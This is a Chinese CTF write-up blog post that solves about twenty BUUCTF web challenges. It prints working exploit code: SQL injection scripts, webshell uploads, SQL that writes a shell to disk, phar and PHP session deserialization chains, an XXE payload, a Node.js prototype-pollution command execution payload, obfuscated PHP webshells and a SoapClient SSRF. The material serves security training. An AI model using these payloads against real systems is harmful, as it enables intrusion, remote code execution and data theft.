---
title: BUUCTF(五)
categories: ctf题目
---

# 前言

BUU - 五

<!--more-->

# [CISCN2019 华东南赛区]Web4

一个url参数，过滤了file，提示no hack，这个路由也有点奇怪，如果是php因该是index.php?xxx，尝试/etc/passwd成功

![image-20220216164625009](https://img-blog.csdnimg.cn/img_convert/be95323c75f12e020bbfeaac994246fd.png)



读取一下当前进程，知道是python 源码在 **/app/app.py**

![image-20220222002226791](https://img-blog.csdnimg.cn/img_convert/fbda89f1797fd866b03653fcb0ffb523.png)



```python
random.seed(uuid.getnode())
app.config['SECRET_KEY'] = str(random.random()*233)


@app.route('/flag')
def flag():
    if session and session['username'] == 'fuck':
        return open('/flag.txt').read()
```

这两行

```
random.seed(uuid.getnode())  
app.config['SECRET_KEY'] = str(random.random()*233)
```

伪随机数，uuid.getnode()获取mac地址，linux下mac地址的位置：**/sys/class/net/eth0/address**

```
import random

mac="02:42:ae:00:4b:75 "
nmac=mac.replace(":", "")
random.seed(int(nmac,16))
key = str(random.random() * 233)
print(key)
```

然后伪造session

```
python3 __main__.py --sign --cookie "{'username':'fuck'}" --secret '104.175054047'
```



# [RoarCTF 2019]Simple Upload

```php
<?php
namespace Home\Controller;

use Think\Controller;

class IndexController extends Controller
{
    public function index()
    {
        show_source(__FILE__);
    }
    public function upload()
    {
        $uploadFile = $_FILES['file'] ;
        
        if (strstr(strtolower($uploadFile['name']), ".php") ) {
            return false;
        }
        
        $upload = new \Think\Upload();// 实例化上传类
        $upload->maxSize  = 4096 ;// 设置附件上传大小
        $upload->allowExts  = array('jpg', 'gif', 'png', 'jpeg');// 设置附件上传类型
        $upload->rootPath = './Public/Uploads/';// 设置附件上传目录
        $upload->savePath = '';// 设置附件上传子目录
        $info = $upload->upload() ;
        if(!$info) {// 上传错误提示错误信息
          $this->error($upload->getError());
          return;
        }else{// 上传成功 获取上传文件信息
          $url = __ROOT__.substr($upload->rootPath,1).$info['file']['savepath'].$info['file']['savename'] ;
          echo json_encode(array("url"=>$url,"success"=>1));
        }
    }
}
```

这个一眼看出问题所在

```
$upload->allowExts  = array('jpg', 'gif', 'png', 'jpeg');// 设置附件上传类型
```

showdoc也存在这个问题 [ShowDoc 任意文件上传漏洞 | Y0ng的博客 (yongsheng.site)](http://www.yongsheng.site/2021/06/28/Showdoc 前台任意文件上传/)

```python
import requests

url = "http://5fd19e67-4105-4515-8267-90ec10349865.node4.buuoj.cn:81/index.php/home/index/upload/"
s = requests.Session()
files = {"file": ("shell.<>php", "<?php eval($_GET['cmd'])?>")}
r = requests.post(url, files=files)
print(r.text)
```

# [SUCTF 2018]annonymous

```php
<?php

$MY = create_function("","die(`cat flag.php`);");
$hash = bin2hex(openssl_random_pseudo_bytes(32));
eval("function SUCTF_$hash(){"
    ."global \$MY;"
    ."\$MY();"
    ."}");
if(isset($_GET['func_name'])){
    $_GET["func_name"]();
    die();
}
show_source(__FILE__);
```

**create_function()**函数在创建之后会 **生成一个函数名** 为：**%00lambda_%d** 详情参见 [使用create_function()创建"匿名"函数](https://blog.csdn.net/weixin_34290352/article/details/91875039)

**%d** 是持续递增的，这里的%d会一直递增到最大长度直到结束，

预期：通过大量的请求来迫使`Pre-fork`模式启动，Apache启动新的线程，这样这里的`%d`会刷新为1，就可以预测了

非预期：爆破后面的 %d



# October 2019 Twice SQL Injection

二次注入

```
username =1' union select database() #
username =1' union select group_concat(table_name) from information_schema.tables where table_schema='ctftraining' #
username =1' union select group_concat(column_name) from information_schema.columns where table_name='flag'#
username =1' union select flag from flag #
```



# [Black Watch 入群题]Web

抓包发现存在注入 **/backend/content_detail.php?id=3**

二分法

```python
import requests

url = "http://a9e76264-28bb-40ed-9685-224b1d96a7d5.node4.buuoj.cn:81/backend/content_detail.php?id="

result = ""
i = 0

while (True):
    i = i + 1
    head = 32
    tail = 127

    while (head < tail):
        mid = (head + tail) >> 1

        # payload = "if(ascii(substr(database(),%d,1))>%d,1,0)" % (i , mid)
        #payload = "if(ascii(substr((select/**/group_concat(table_name)from(information_schema.tables)where(table_schema=database())),%d,1))>%d,1,0)" % (i, mid)
        payload = "if(ascii(substr((select(group_concat(password))from(admin)),%d,1))>%d,3,2)" % (i , mid)


        r = requests.get(url + payload)
        r.encoding = "utf-8"
        # print(url+payload)
        if "Yunen" in r.text:
            head = mid + 1
        else:
            # print(r.text)
            tail = mid

    last = result

    if head != 32:
        result += chr(head)
    else:
        break
    print(result)
```

二分异或

```python
import requests
url = "http://28efd88e-90e7-48b0-aa07-9ed14c473b27.node3.buuoj.cn/backend/content_detail.php?id=2^"

name = ""
i=0
while True :
	head = 32
	tail = 127
	i += 1
	while(head<tail):
		mid = head + tail >> 1
		payload = "(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),%d,1))>%d)" %(i,mid)
		payload = "(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name='contents')),%d,1))>%d)" %(i,mid)
		payload = "(ascii(substr((select(group_concat(username))from(admin)),%d,1))>%d)" %(i,mid)
		
		r = requests.get(url+payload)
		#print(url+payload)
		#print(r.json())
		if "Yunen" in str(r.json()):
			head = mid + 1
		else:
			tail = mid
	if head!=32 :
		name += chr(head)
		print(name)
	else:
		break
```



# [GXYCTF2019]BabysqliV3.0

弱口令登录 admin password

![image-20220216212632630](https://img-blog.csdnimg.cn/img_convert/3271ab0d37986d51b02df810747f6b81.png)

file参数直接拼接到后面，尝试文件包含，读取源码，

```php
<?php
error_reporting(0);
class Uploader{
	public $Filename;
	public $cmd;
	public $token;
	

	function __construct(){
		$sandbox = getcwd()."/uploads/".md5($_SESSION['user'])."/";
		$ext = ".txt";
		@mkdir($sandbox, 0777, true);
		if(isset($_GET['name']) and !preg_match("/data:\/\/ | filter:\/\/ | php:\/\/ | \./i", $_GET['name'])){  //没有过滤phar
			$this->Filename = $_GET['name'];
		}
		else{
			$this->Filename = $sandbox.$_SESSION['user'].$ext;
		}

		$this->cmd = "echo '<br><br>Master, I want to study rizhan!<br><br>';";
		$this->token = $_SESSION['user'];
	}

	function upload($file){
		global $sandbox;
		global $ext;

		if(preg_match("[^a-z0-9]", $this->Filename)){
			$this->cmd = "die('illegal filename!');";
		}
		else{
			if($file['size'] > 1024){
				$this->cmd = "die('you are too big (′▽`〃)');";
			}
			else{
				$this->cmd = "move_uploaded_file('".$file['tmp_name']."', '" . $this->Filename . "');";
			}
		}
	}

	function __toString(){
		global $sandbox;
		global $ext;
		// return $sandbox.$this->Filename.$ext;
		return $this->Filename;
	}

	function __destruct(){
		if($this->token != $_SESSION['user']){
			$this->cmd = "die('check token falied!');";
		}
		eval($this->cmd);
	}
}

if(isset($_FILES['file'])) {
	$uploader = new Uploader();
	$uploader->upload($_FILES["file"]);
	if(@file_get_contents($uploader)){  //触发toString->触发phar反序列化
		echo "下面是你上传的文件：<br>".$uploader."<br>"; //__toString
		echo file_get_contents($uploader);  
	}
}
?>
```

明显的phar反序列化，name参数可控可利用phar，利用点在eval，逻辑很简单，需要注意的是 **$_SESSION['user']** 需要提前传一个文件获得

```php
<?php
class Uploader{
	public $Filename;
	public $cmd;
	public $token;
}
$a = new Uploader();
$a->Filename = "test";
$a->token = "GXYae5e4e67204bdd0d998be4c3d519c3a4";
$a->cmd = 'highlight_file("/var/www/html/flag.php");';
echo serialize($a);

$phar = new Phar("phar.phar");
$phar->startBuffering();
$phar->setStub("GIF89a"."<?php __HALT_COMPILER(); ?>"); //设置stub，增加gif文件头
$phar->setMetadata($a); //将自定义meta-data存入manifest
$phar->addFromString("test.txt", "test"); //添加要压缩的文件
$phar->stopBuffering();

?>
```

得到

```
/var/www/html/uploads/870dc653fad7e522c10381da203ce6aa/GXYae5e4e67204bdd0d998be4c3d519c3a4.txt
```

再上传一个文件，加上name参数

![image-20220216232411080](https://img-blog.csdnimg.cn/img_convert/bda2be4718ef1562fa1cae003dfcf94a.png)



![image-20220216235350784](https://img-blog.csdnimg.cn/img_convert/b08902e060e5544f4eaee5836b1cd2d9.png)



# (**)[SUCTF 2018]MultiSQL

- 预处理堆叠注入写shell

[[SUCTF 2018\]MultiSQL(sql读取文件+写入文件) | (guokeya.github.io)](https://guokeya.github.io/post/t4QExMZtn/)

注册用户test，发现个人用户信息处可以修改头像并修改id参数越权访问admin，参数存在注入，但是后续数据被过滤

![image-20220216221059120](https://img-blog.csdnimg.cn/img_convert/f50d0fa4a7038576967bc83bde3fed36.png)

wp为堆叠注入，还能读文件

```python
import requests
cookies = {
    "PHPSESSID":"fg4kp97ksielnvnssv53iul2s6"
}
data='0x'
flag=''
r=requests.session()
for i in range(9999):
    for i in range(1,127):
        #print (i)
        url='http://e70a6fd4-f987-4651-9aa1-4bfd134e9a59.node3.buuoj.cn/user/user.php?id=0^(hex(load_file(0x2f7661722f7777772f68746d6c2f696e6465782e706870))<'+data+str(hex(i)).replace('0x','')+')'
        result=r.get(url=url,cookies=cookies).text
        if 'admin' in result:
            data+=str(hex(i-1)).replace('0x','')
            flag+=(chr(i-1))
            print (flag)
            break
print(data)
```

堆叠预处理写shell

```
select hex("select '<?php eval($_POST[cmd]);?>' into outfile '/var/www/html/favicon/shell.php';");
```

```
set @a=0x73656C65637420273C3F706870206576616C28245F504F53545B636D645D293B3F3E2720696E746F206F757466696C6520272F7661722F7777772F68746D6C2F66617669636F6E2F7368656C6C2E706870273B;
prepare test from @a;
execute test;
```

也可以用chr()

```python
s = "select '<?php eval($_POST[cmd]);?>' into outfile '/var/www/html/favicon/shell2.php';"
l = []
for i in s:
    l.append(str(ord(i)))
result = 'char('+','.join(l)+')'
print(result)
```

```
1;set @a=char(115,101,108,101,99,116,32,39,60,63,112,104,112,32,101,118,97,108,40,36,95,80,79,83,84,91,99,109,100,93,41,59,63,62,39,32,105,110,116,111,32,111,117,116,102,105,108,101,32,39,47,118,97,114,47,119,119,119,47,104,116,109,108,47,102,97,118,105,99,111,110,47,115,104,101,108,108,50,46,112,104,112,39,59);prepare test from @a;execute test;
```

# [SWPU2019]Web4

- 十六进制预处理sql注入
- 堆叠注入

![image-20220217232120659](https://img-blog.csdnimg.cn/img_convert/956284c3afa84d7f3dc7596fde313a9e.png)

```python
import time
import requests
import json


def str_to_hex(str):
    return ''.join(hex(ord(c)).replace('0x', '') for c in str)

def binary(iterator, cu ,comparer):
    time.sleep(0.5)#必须要加，也不知道为什么，也不是429，但不加就乱码，而且要多跑几次
    startTime = time.time()
    waitSeconds = 2  # 等待时间
    checkSeconds = 0.2  # 容忍时间
    target = 'http://0a5d1c32-a986-4421-ab81-fba57cded578.node3.buuoj.cn/index.php?r=Login/login'
    payload = "a';SET @a=0x{0};PREPARE run from @a;EXECUTE run-- -"
    datas = {"username" : payload.format(str_to_hex("select if(ascii(substr((select flag from flag),{},1)){comparer}{},sleep({}),1)".format(iterator, cu, waitSeconds, comparer=comparer))), "password" : "123"}
    r = requests.post(target, data=json.dumps(datas))
    # print(r.text)
    # print(r.status_code)
    if (abs(time.time() - startTime - waitSeconds) < checkSeconds):
        return True
    else:
        return False

def test(iterator):
    l = 0
    r = 255
    while (l <= r):
        cu = (l + r) // 2
        if (binary(iterator, cu, "<")):
            r = cu - 1
        elif (binary(iterator, cu, ">")):
            l = cu + 1
        elif (cu == 0):
            return None
        else:
            return chr(cu)

def main():
    print("(+) 程序开始")
    finalRes = ""
    iterator = 1
    while (True):
        extracted_char = test(iterator)
        if (extracted_char == None):
            break
        finalRes += extracted_char
        iterator += 1
        print("(+) 当前结果:{}".format(finalRes), end="\r\n")
    print("(+) 运行完成,结果为:", finalRes)

if __name__ == '__main__':
    main()
```

跑出来 **glzjin_wants_a_girl_friend.zip**，下载发现mvc框架

fun.php中r参数调用指定控制器与方法

![image-20220217234210610](https://img-blog.csdnimg.cn/img_convert/ce78f664527b4b9c0edac562df469e45.png)

UserController.php中，loadView去加载视图文件，此方法继承于BaseController

![image-20220217234336959](https://img-blog.csdnimg.cn/img_convert/6670308c26ce211966f3560ff1997084.png)

存在变量覆盖

![image-20220217234429444](https://img-blog.csdnimg.cn/img_convert/5473ec244c360e64ee07078876b61e25.png)

在userIndex.php中利用imgToBase64，输出flag.php的b64编码

![image-20220217234718351](https://img-blog.csdnimg.cn/img_convert/0edec386d9f24f5efca2d6e948813f18.png)

payload：**?r=User/Index&img_file=/../flag.php**

# [极客大挑战 2020]Roamphp1-Welcome

首页405

![image-20220217235811960](https://img-blog.csdnimg.cn/img_convert/043fb87c2f560ac870ea71dc72bf069a.png)

更换请求方式为post

```php
<?php
error_reporting(0);
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
header("HTTP/1.1 405 Method Not Allowed");
exit();
} else {
    
    if (!isset($_POST['roam1']) || !isset($_POST['roam2'])){
        show_source(__FILE__);
    }
    else if ($_POST['roam1'] !== $_POST['roam2'] && sha1($_POST['roam1']) === sha1($_POST['roam2'])){
        phpinfo();  // collect information from phpinfo!
    }
}
```

数组绕过： roam1[]=1&roam2[]=2 ，phpinfo搜索flag

# [FireshellCTF2020]Caas

挺新鲜的题目，可以将c代码编译成elf文件

![image-20220218002417596](https://img-blog.csdnimg.cn/img_convert/b8825ff800201279e68f6f85c2306f4b.png)

**#include "/flag"** 引入一下，报错信息出现flag

# [BSidesCF 2019]SVGMagic

svg转png

![image-20220218002810265](https://img-blog.csdnimg.cn/img_convert/82d9998ea765986ea9986cfa8b59040e.png)

先看一下svg定义：SVG 是使用 XML 来描述二维图形和绘图程序的语言。

看一下svg长什么样

![image-20220218003348134](https://img-blog.csdnimg.cn/img_convert/d93f8ac7fb0314a38b5723821168700c.png)

当然想到能xxe喽还能xss，[浅谈SVG的两个黑魔法 - 知乎 (zhihu.com)](https://zhuanlan.zhihu.com/p/323315064) ，**/proc/self/cwd/ **代表的是当前路径

payload

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE note [
<!ENTITY file SYSTEM "file:///proc/self/cwd/flag.txt" >
]>
<svg height="100" width="1000">
  <text x="10" y="20">&file;</text>
</svg>
```



# [HarekazeCTF2019]Avatar Uploader 

因为 **finfo_file()** 可以识别png图片**十六进制下的第一行**，而 **getimagesize** 不可以。所以只要保持png头破坏掉文件长宽等其余信息就能绕过了，使用010工具把文件头单独保留出来，然后进行文件上传

[(3条消息) [HarekazeCTF2019\]Avatar Uploader 1_Youth____的博客-CSDN博客](https://blog.csdn.net/Youth____/article/details/113574132)

```
89 50 4E 47 0D 0A 1A 0A 00 00 00 0D 49 48 44 52
```



# [GYCTF2020]Ez_Express

- nodejs
- 原型污染

随便注册一个进去发现www.zip泄露，下载审计

![image-20220218012132137](https://img-blog.csdnimg.cn/img_convert/570174056630b439bf1dd78183af44b2.png)



> 在Character.toUpperCase()函数中，字符ı会转变为I，字符ſ会变为S。
> 在Character.toLowerCase()函数中，字符İ会转变为i，字符K会转变为k。

所以 **admın** 即可登陆成功，/action下发现clone操作

![image-20220218013055443](https://img-blog.csdnimg.cn/img_convert/e2d3d77fc18dbc7f6cf507c2367beeed.png)

原型链污染

![image-20220218013130844](https://img-blog.csdnimg.cn/img_convert/b41de03cd7a7fea547f1cde1ab5de181.png)

可以看到在/info下，使用将outputFunctionName渲染入index中，而outputFunctionName是未定义的 **res.outputFunctionName=undefined**

那就可以向上污染outputFunctionName

payload

```
{"__proto__":{"outputFunctionName":"a=1;return global.process.mainModule.constructor._load('child_process').execSync('cat /flag')//"},"Submit":""}
```

访问 /info 得到flag

# [RoarCTF 2019]Online Proxy

注入脚本

```python
#!/usr/bin/env python3

import requests

target = "http://localhost:8302/"

def execute_sql(sql):
    print("[*]请求语句：" + sql)
    return_result = ""

    payload = "0'|length((" + sql + "))|'0"
    session = requests.session()
    r = session.get(target, headers={'X-Forwarded-For': payload})
    r = session.get(target, headers={'X-Forwarded-For': 'glzjin'})
    r = session.get(target, headers={'X-Forwarded-For': 'glzjin'})
    start_pos = r.text.find("Last Ip: ")
    end_pos = r.text.find(" -->", start_pos)
    length = int(r.text[start_pos + 9: end_pos])
    print("[+]长度：" + str(length))

    for i in range(1, length + 1, 5):
        payload = "0'|conv(hex(substr((" + sql + ")," + str(i) + ",5)),16,10)|'0"

        r = session.get(target, headers={'X-Forwarded-For': payload}) # 将语句注入
        r = session.get(target, headers={'X-Forwarded-For': 'glzjin'})    # 查询上次IP时触发二次注入
        r = session.get(target, headers={'X-Forwarded-For': 'glzjin'})    # 再次查询得到结果
        start_pos = r.text.find("Last Ip: ")
        end_pos = r.text.find(" -->", start_pos)
        result = int(r.text[start_pos + 9: end_pos])
        return_result += bytes.fromhex(hex(result)[2:]).decode('utf-8')

        print("[+]位置 " + str(i) + " 请求五位成功:" + bytes.fromhex(hex(result)[2:]).decode('utf-8'))

    return return_result


# 获取数据库
print("[+]获取成功：" + execute_sql("SELECT group_concat(SCHEMA_NAME) FROM information_schema.SCHEMATA"))

# 获取数据库表
print("[+]获取成功：" + execute_sql("SELECT group_concat(TABLE_NAME) FROM information_schema.TABLES WHERE TABLE_SCHEMA = 'F4l9_D4t4B45e'"))

# 获取数据库表
print("[+]获取成功：" + execute_sql("SELECT group_concat(COLUMN_NAME) FROM information_schema.COLUMNS WHERE TABLE_SCHEMA = 'F4l9_D4t4B45e' AND TABLE_NAME = 'F4l9_t4b1e' "))

# 获取表中内容
print("[+]获取成功：" + execute_sql("SELECT group_concat(F4l9_C01uMn) FROM F4l9_D4t4B45e.F4l9_t4b1e"))
```



# [安洵杯 2019]不是文件上传

[安洵杯2019 官方Writeup(Web/Misc) - D0g3 - 先知社区 (aliyun.com)](https://xz.aliyun.com/t/6911#toc-6)

源码泄露->代码审计->上传文件导致sql注入，在查看图片信息的页面(show.php)会对其进行反序列化，将序列化的数据利用sql查到数据库，访问show.php

正常sql语句

```
INSERT INTO images (`title`,`filename`,`ext`,`path`,`attr`) VALUES('TIM截图
20191102114857','f20c76cc4fb41838.jpg','jpg','pic/f20c76cc4fb41838.jpg','a:2:{s:5:"width";i:1264;s:6:"height";i:992;}')
```

title可控，所以插入语句

```
1','1','1','1',0x4f3a363a2268656c706572223a323a7b733a393a225c305c305c30696676696577223b623a313b733a393a225c305c305c30636f6e666967223b733a353a222f666c6167223b7d),('1.jpg
```



# [SUCTF 2018]GetShell

汉字取反,fuzz：[SUCTF 2018\GetShell_末初 · mochu7-CSDN博客](https://blog.csdn.net/mochu7777777/article/details/107729445)

```
//shell.txt
//assert($_POST[_])
<?php
$__=[];
$_=($__==$__);
$__=~(融);
$___=$__[$_];
$__=~(匆);
$___.=$__[$_].$__[$_];
$__=~(随);
$___.=$__[$_];
$__=~(千);
$___.=$__[$_];
$__=~(苦);
$___.=$__[$_];
$____=~(~(_));
$__=~(诗);
$____.=$__[$_];
$__=~(尘);
$____.=$__[$_];
$__=~(欣);
$____.=$__[$_];
$__=~(站);
$____.=$__[$_];
$_=$$____;
$___($_[_]);
```

```
//a
<?=$_=[];$__.=$_;$____=$_==$_;$___=~茉[$____];$___.=~内[$____];$___.=~茉[$____];$___.=~苏[$____];$___.=~的[$____];$___.=~咩[$____];$_____=_;$_____.=~课[$____];$_____.=~尬[$____];$_____.=~笔[$____];$_____.=~端[$____];$__________=$$_____;$___($__________[~瞎[$____]]);
```

# [强网杯 2019]Upload

www.tar.gz 泄露，index.php存在反序列化cookie

![image-20220221144236116](https://img-blog.csdnimg.cn/img_convert/62956676ba3ffa4ca5844794c34b0a2f.png)

register.php为入口

![image-20220221145152657](https://img-blog.csdnimg.cn/img_convert/844ff9d68ecedc7f75d01a2f4e7886ae.png)

触发profile中魔法方法，调用upload_img方法，可控的文件名

![image-20220221145208936](https://img-blog.csdnimg.cn/img_convert/38b23843e950a396cef0f0c0b7230f38.png)



![image-20220221145257621](https://img-blog.csdnimg.cn/img_convert/b1fe763d5f46639c9536902625a5621a.png)

先上传图片马，修改cookie，exp:

```
<?php
namespace app\web\controller;

class Register{
    public $checker;
    public $registed =0;
}
class Profile{
    public $checker =0 ;
    public $filename_tmp="./upload/cc551ab005b2e60fbdc88de809b2c4b1/364be8860e8d72b4358b5e88099a935a.png";
	public $upload_menu;
    public $filename="upload/shell.php";
    public $ext=1;
	public $img;
    public $except=array("index"=>"upload_img");
}
$a = new Register();
$a->checker = new Profile();
$a->checker->checker=0;
echo base64_encode(serialize($a));
```

# bestphp's revenge

- phpsession反序列化
- 原生类SoapClient打内网

挺有意思的一道题，index.php

```
<?php
highlight_file(__FILE__);
$b = 'implode';
call_user_func($_GET['f'], $_POST);
session_start();
if (isset($_GET['name'])) {
    $_SESSION['name'] = $_GET['name'];
}
var_dump($_SESSION);
$a = array(reset($_SESSION), 'welcome_to_the_lctf2018');
call_user_func($b, $a);
?>
```

flag.php

```
only localhost can get flag!session_start();
echo 'only localhost can get flag!';
$flag = 'flag{*************************}';
if($_SERVER["REMOTE_ADDR"]==="127.0.0.1"){
       $_SESSION['flag'] = $flag;
   }
only localhost can get flag!
```

解题：

**PHP 7 中 session_start () 函数可以接收一个数组作为参数，可以覆盖 php.ini 中 session 的配置项。这个特性也引入了一个新的 php.ini 设置（session.lazy_write）**

利用phpsession反序列化引擎的不同，传入反序列化字符串

```
<?php
$target='http://127.0.0.1/flag.php';
$b = new SoapClient(null,array('location' => $target,
    'user_agent' => "npfs\r\nCookie:PHPSESSID=123456\r\n",
    'uri' => "http://127.0.0.1/"));

$se = serialize($b);
echo "|".urlencode($se);

//注意下，这个脚本想要执行，需要将php.ini里的 php_soap.dll 前面的分号去掉
```

传入

```
?f=session_start&name=|O%3A10%3A%22SoapClient%22%3A.......
//POST
serialize_handler=php_serialize
```

![image-20220221153522990](https://img-blog.csdnimg.cn/img_convert/b94d1d91b3f9ceb3caa0132bb92c9455.png)

传值

```
f=extract&name=SoapClient 
POST:b=call_user_func
```

这样 call_user_func(\$b,\$a)就变成**call_user_func(‘call_user_func’,array(‘SoapClient’,’welcome_to_the_lctf2018’))** ，即调用 SoapClient 类不存在的 welcome_to_the_lctf2018 方法，从而触发 __call 方法发起 soap 请求进行 SSRF 

![image-20220221153914520](https://img-blog.csdnimg.cn/img_convert/46f72698a63e80975c05d30ab10fa5ec.png)

修改phpsessid为123456，访问index.php即可



